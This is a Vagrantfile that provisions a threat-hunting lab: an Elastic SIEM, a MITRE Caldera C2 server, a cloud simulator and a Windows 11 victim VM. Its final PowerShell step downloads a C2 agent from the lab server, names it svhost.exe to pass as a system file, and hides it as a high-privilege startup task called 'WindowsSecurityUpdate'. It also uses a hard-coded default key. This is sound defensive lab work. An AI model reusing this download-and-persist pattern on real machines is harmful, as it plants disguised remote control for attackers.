# Vagrantfile
# Threat Hunting Lab: Elastic SIEM + Windows 11 Victim + MITRE Caldera + Local Cloud Sim
#
# IMPORTANT: Provision elastic-siem first — it writes the Fleet enrollment
# token that win11-victim needs during its provisioning step.
#
# Recommended launch order (handled automatically by setup.sh):
#   vagrant up elastic-siem
#   vagrant up caldera cloud-sim win11-victim
#
# Manual launch:
#   vagrant up --no-parallel

Vagrant.configure("2") do |config|

  # Disable automatic box update checks for reproducibility
  config.vm.box_check_update = false

  # ── Elastic SIEM ──────────────────────────────────────────────────────────
  config.vm.define "elastic-siem" do |elastic|
    elastic.vm.box      = "bento/ubuntu-22.04"
    elastic.vm.hostname = "elastic-siem"
    elastic.vm.network  "private_network", ip: "192.168.56.10"

    elastic.vm.provider "vmware_desktop" do |v|
      v.memory = 8192
      v.cpus   = 4
      v.vmx["displayname"] = "elastic-siem"
      v.gui = false
      v.linked_clone = false
    end

    elastic.vm.provision "shell", path: "scripts/install_elastic.sh"
  end

  # ── MITRE Caldera ─────────────────────────────────────────────────────────
  # Provisioned before win11-victim so the C2 is ready when the agent
  # is deployed, though it has no ordering dependency on elastic-siem.
  config.vm.define "caldera" do |cal|
    cal.vm.box      = "bento/ubuntu-22.04"
    cal.vm.hostname = "caldera"
    cal.vm.network  "private_network", ip: "192.168.56.30"

    cal.vm.provider "vmware_desktop" do |v|
      v.memory = 4096
      v.cpus   = 2
      v.vmx["displayname"] = "caldera"
      v.gui = false
      v.linked_clone = false
    end

    cal.vm.provision "shell", path: "scripts/install_caldera.sh"
  end

  # ── Local Cloud Simulator (LocalStack + CloudTrail + Filebeat) ───────────
  config.vm.define "cloud-sim" do |cloud|
    cloud.vm.box      = "bento/ubuntu-22.04"
    cloud.vm.hostname = "cloud-sim"
    cloud.vm.network  "private_network", ip: "192.168.56.40"

    cloud.vm.provider "vmware_desktop" do |v|
      v.memory = 4096
      v.cpus   = 2
      v.vmx["displayname"] = "cloud-sim"
      v.gui = false
      v.linked_clone = false
    end

    cloud.vm.provision "shell", path: "scripts/install_cloud_sim.sh"
  end

  # ── Windows 11 Victim ─────────────────────────────────────────────────────
  # Must be provisioned AFTER elastic-siem writes fleet-enrollment-token.txt
  config.vm.define "win11-victim" do |win|
    win.vm.box              = "gusztavvargadr/windows-11"
    win.vm.hostname         = "win11-victim"
    win.vm.communicator     = "winrm"
    win.vm.network          "private_network", ip: "192.168.56.20"
    win.vm.boot_timeout     = 600   # Windows 11 boot can exceed the 300s default

    win.vm.provider "vmware_desktop" do |v|
      v.memory = 4096
      v.cpus   = 2
      v.vmx["displayname"]              = "win11-victim"
      v.vmx["uefi.secureBoot.enabled"]  = "FALSE"
      v.gui = false
      # Force Workstation product type so vmrun uses -T ws (not -T player).
      # The utility reports "standard" license, which the plugin maps to "player"
      # mode (disabling snapshots). "workstation" forces @pro_license = true,
      # enabling vmrun -T ws + linked clone (Issues 4 and 27).
      v.force_vmware_license = "workstation"
      v.linked_clone = true
    end

    # Abort early with a clear message if elastic-siem hasn't been provisioned yet
    win.vm.provision "shell", inline: <<~POWERSHELL, privileged: false
      if (-not (Test-Path "C:\\vagrant\\fleet-enrollment-token.txt")) {
        Write-Error "fleet-enrollment-token.txt not found. Run 'vagrant up elastic-siem' first."
        exit 1
      }
    POWERSHELL

    # Run script from shared folder — avoids WinRM file-upload bug in vagrant-vmware-desktop
    win.vm.provision "shell", name: "install_win_tools", privileged: false, inline: <<~POWERSHELL
      powershell -ExecutionPolicy Bypass -File "C:\\vagrant\\scripts\\install_win_tools.ps1"
    POWERSHELL

    # Deploy Caldera sandcat agent (can be re-run independently)
    win.vm.provision "shell", name: "deploy_caldera_agent", run: "never", privileged: false, inline: <<~'POWERSHELL'
      powercfg /change standby-timeout-ac 0 | Out-Null
      powercfg /change hibernate-timeout-ac 0 | Out-Null
      $CalderaServer = "http://192.168.56.30:8888"
      $SandcatPath   = "C:\Users\Public\svhost.exe"
      $TaskName      = "WindowsSecurityUpdate"
      $existingTask  = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
      if ($existingTask) {
        Write-Host "[caldera-agent] Stopping existing task before re-download..."
        Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
      }
      Get-Process -Name "svhost" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
      Write-Host "[caldera-agent] Downloading sandcat..."
      & curl.exe -fsSL -o $SandcatPath -H "file: sandcat.go-windows" -H "KEY: ADMIN123" "$CalderaServer/file/download" 2>$null
      if ($LASTEXITCODE -ne 0) { Write-Host "[caldera-agent] ERROR: download failed (exit $LASTEXITCODE)"; exit 1 }
      Write-Host "[caldera-agent] Registering scheduled task..."
      $Action   = New-ScheduledTaskAction -Execute $SandcatPath -Argument "-server $CalderaServer -group red"
      $Trigger  = New-ScheduledTaskTrigger -AtStartup
      $Settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0 -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
      Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -RunLevel Highest -Force | Out-Null
      Write-Host "[caldera-agent] Starting sandcat via scheduled task (survives WinRM close)..."
      Start-ScheduledTask -TaskName $TaskName
      Write-Host "[caldera-agent] Done."
      exit 0
    POWERSHELL
  end

end
